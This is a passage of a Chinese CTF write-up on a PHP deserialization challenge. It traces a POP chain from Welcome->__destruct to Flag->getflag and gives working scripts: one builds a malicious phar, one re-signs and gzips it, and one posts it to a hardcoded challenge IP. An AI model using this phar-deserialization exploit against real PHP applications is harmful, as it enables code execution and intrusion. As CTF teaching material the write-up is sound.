<p>可以看到在<code>Info</code>,<code>Route</code>和<code>User</code>中存在<code>__toString</code>方法</p>
<ol>
<li><code>Info-&gt;__toString</code></li>
</ol>
<p>返回<code>Info-&gt;info</code>的序列化结果,没有利用价值</p>
<ol start="2">
<li><code>Route-&gt;__toString</code></li>
</ol>
<p>当<code>Route-&gt;action==&quot;setupinfo&quot;</code>时,且<code>$this-&gt;route</code>指向某个类时,会执行该类中的<code>setupinfo</code>方法,当该类中不存在该方法时,会执行该类中的<code>__call</code>方法</p>
<p>注意到<code>Method</code>中存在<code>__call</code>方法,同时其中使用了<code>call_user_func_array</code></p>
<p>但<code>Method-&gt;check_method</code>将<code>$this-&gt;methods[$method]</code>设置为其他字符串,无法被利用</p>
<ol start="3">
<li><code>User-&gt;__toString</code></li>
</ol>
<p>注意到<code>__toString</code>方法中<code>$address = $this-&gt;private_info[&#39;address&#39;]</code>同时会调用<code>$address-&gt;birthplace</code></p>
<p>当<code>$this-&gt;private_info[&#39;address&#39;]</code>指向一个类时,同时该类中不存在<code>birthplace</code>属性时会调用该类的<code>__get</code>方法,注意到<code>Filter</code>中存在<code>__get</code>方法</p>
<p><code>Filter-&gt;__get</code>执行了<code>Filter-&gt;get</code>,其中当满足<code>array_key_exists($name, $this-&gt;params)</code>会执行<code>call_user_func($this-&gt;params[$name])</code></p>
<p>若<code>$this-&gt;params[$name]</code>为<code>array(new Flag,&quot;getflag&quot;)</code>即可执行<code>Flag-&gt;getflag</code></p>
<p>即当<code>$filter-&gt;params=array(&quot;birthplace&quot;=&gt;array(new Flag,&quot;getflag&quot;));</code>时可以执行<code>Flag-&gt;getflag</code></p>
<p>由此可得pop链<code>Welcome-&gt;__destruct</code> -&gt; <code>User-&gt;__toString</code> -&gt; <code>Filter-&gt;__get</code> -&gt; <code>Filter-&gt;get</code> -&gt; <code>Flag-&gt;getflag</code></p>
<hr>
<p>create_phar.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$welcome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$randcode</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sha1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sha2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">array</span> <span class="variable">$basic_info</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">array</span> <span class="variable">$private_info</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$basic_info</span>, <span class="keyword">array</span> <span class="variable">$private_info</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;basic_info = <span class="variable">$basic_info</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;private_info = <span class="variable">$private_info</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Filter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">array</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fake</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;source.phar&quot;</span>); <span class="comment">//创建phar文件时后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置存根stub</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$welcome</span> = <span class="keyword">new</span> <span class="title class_">Welcome</span>();</span><br><span class="line"><span class="variable">$filter</span> = <span class="keyword">new</span> <span class="title class_">Filter</span>();</span><br><span class="line"><span class="variable">$filter</span>-&gt;params=<span class="keyword">array</span>(<span class="string">&quot;birthplace&quot;</span>=&gt;<span class="keyword">array</span>(<span class="variable">$flag</span>,<span class="string">&quot;getflag&quot;</span>));</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>), <span class="keyword">array</span>(<span class="string">&quot;address&quot;</span> =&gt; <span class="variable">$filter</span>));</span><br><span class="line"><span class="variable">$welcome</span>-&gt;code =&amp; <span class="variable">$welcome</span>-&gt;randcode;</span><br><span class="line"><span class="variable">$welcome</span>-&gt;welcome = <span class="variable">$user</span>;</span><br><span class="line"><span class="variable">$sha1</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$message</span> = <span class="string">&quot;misaka&quot;</span>, <span class="variable">$code</span> = <span class="number">0</span>);<span class="variable">$sha2</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$message</span> = <span class="string">&quot;misaka&quot;</span>, <span class="variable">$code</span> = <span class="number">1</span>);<span class="comment">#不要换行</span></span><br><span class="line"><span class="variable">$welcome</span>-&gt;sha1=<span class="variable">$sha1</span>;</span><br><span class="line"><span class="variable">$welcome</span>-&gt;sha2=<span class="variable">$sha2</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$fake</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fake</span>();</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="variable">$welcome</span>, <span class="variable">$fake</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data序列化后存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;a&quot;</span>); <span class="comment">//phar本质上是对文件的压缩所以要添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">$pharfile = &quot;asdf.phar&quot;;</span></span><br><span class="line"><span class="comment">$gzipfile = &quot;asdf.gzip&quot;;</span></span><br><span class="line"><span class="comment">$fp = gzopen($gzipfile, &quot;w9&quot;);</span></span><br><span class="line"><span class="comment">gzwrite($fp, file_get_contents($pharfile));</span></span><br><span class="line"><span class="comment">gzclose($fp);</span></span><br><span class="line"><span class="comment">$fp = file_get_contents($gzipfile);</span></span><br><span class="line"><span class="comment">var_dump(urlencode($fp));*/</span></span><br></pre></td></tr></table></figure>

<p>convert_phar_to_Gzip.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resign</span>(<span class="params">source=<span class="string">&quot;source.phar&quot;</span>,target=<span class="string">&quot;target.phar&quot;</span></span>):</span><br><span class="line">    phar=<span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(source,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        phar=f.read()</span><br><span class="line">    phar=phar.replace(<span class="string">b&#x27;i:1;O:4:&quot;fake&quot;:0:&#123;&#125;&#x27;</span>,<span class="string">b&#x27;i:0;O:4:&quot;fake&quot;:0:&#123;&#125;&#x27;</span>)</span><br><span class="line">    source=phar[:-<span class="number">28</span>] <span class="comment">#需要进行签名的数据</span></span><br><span class="line">    GBMB=phar[-<span class="number">8</span>:] <span class="comment">#签名标志(通常都是sha1??)和GBMB标签</span></span><br><span class="line">    signature=hashlib.sha1(source).digest() <span class="comment">#sha1签名</span></span><br><span class="line">    phar=source+signature+GBMB</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(target,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(phar)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert</span>(<span class="params">source=<span class="string">&quot;target.phar&quot;</span>,target=<span class="string">&quot;a&quot;</span></span>):</span><br><span class="line">    phar=<span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(source,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        phar=f.read()</span><br><span class="line">    <span class="keyword">with</span> gzip.<span class="built_in">open</span>(target,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(phar)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">resign()</span><br><span class="line">convert()</span><br></pre></td></tr></table></figure>

<p>exploit.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://35.220.149.77:10808/index.php&quot;</span></span><br><span class="line"><span class="comment">#url=&quot;http://127.0.0.1/medium-unserialize/medium-unserialize-index.php&quot;</span></span><br><span class="line">phar=<span class="literal">None</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    phar=f.read()</span><br><span class="line">data=&#123;<span class="string">&#x27;str&#x27;</span>:<span class="string">&#x27;O:4:&quot;main&quot;:1:&#123;s:7:&quot;operate&quot;;s:1:&quot;w&quot;;&#125;&#x27;</span>,<span class="string">&#x27;data&#x27;</span>:phar&#125;</span><br><span class="line">r=requests.post(url=url,data=data)</span><br><span class="line">rule = <span class="string">r&#x27;&lt;/code&gt;(.+?)&lt;br /&gt;&#x27;</span></span><br><span class="line">result = re.findall(rule, r.text)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/CTF/" rel="tag"># CTF</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2021/11/04/vulnhub-Billu_b0x/" rel="prev" title="vulnhub-Billu_b0x">
                  <i class="fa fa-chevron-left"></i> vulnhub-Billu_b0x
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2021/12/01/vulnhub-Jangow_1.0.1/" rel="next" title="vulnhub-Jangow:1.0.1">
                  vulnhub-Jangow:1.0.1 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Misaka</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  





  





</body>
</html>
